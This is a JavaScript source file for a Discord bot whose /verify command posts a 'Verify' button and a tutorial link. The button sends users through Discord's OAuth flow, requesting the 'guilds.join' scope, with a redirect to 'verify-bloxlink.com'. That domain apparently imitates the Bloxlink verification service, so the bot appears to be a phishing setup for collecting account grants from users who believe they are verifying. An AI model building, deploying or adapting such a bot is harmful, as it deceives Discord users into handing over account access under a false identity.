const {
  Client,
  GatewayIntentBits,
  Events,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
} = require("discord.js");

const express = require("express");
const app = express();

app.get("/", (req, res) => {
  res.send("Bot online");
});

app.listen(3000, () => {
  console.log("Web server ativo");
});

const client = new Client({
  intents: [GatewayIntentBits.Guilds],
});

client.once("clientReady", () => {
  console.log("Bot ligado!");
});

client.on(Events.InteractionCreate, async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  if (interaction.commandName === "verify") {
    const verifyButton = new ButtonBuilder()
      .setLabel("Verify")
      .setStyle(ButtonStyle.Link)
      .setURL(
        "https://discord.com/oauth2/authorize?client_id=1482722827000873132&response_type=code&redirect_uri=https%3A%2F%2Fverify-bloxlink.com%2Fverify%3Fserver%3D9530457551924188&scope=identify+guilds.join",
      );

    const tutorialButton = new ButtonBuilder()
      .setLabel("Stuck? See a tutorial")
      .setStyle(ButtonStyle.Link)
      .setURL(
        "https://www.youtube.com/watch?v=SbDltmom1R8&list=PLz7SOP-guESE1V6ywCCLc1IQWiLURSvBE&index=3",
      );

    const row = new ActionRowBuilder().addComponents(
      verifyButton,
      tutorialButton,
    );

    try {
      await interaction.reply({
        content: "To verify, click the link below.",
        components: [row],
      });
    } catch (error) {
      console.error("Erro no /verify:", error);
    }
  }
});

client.login(process.env.TOKEN);
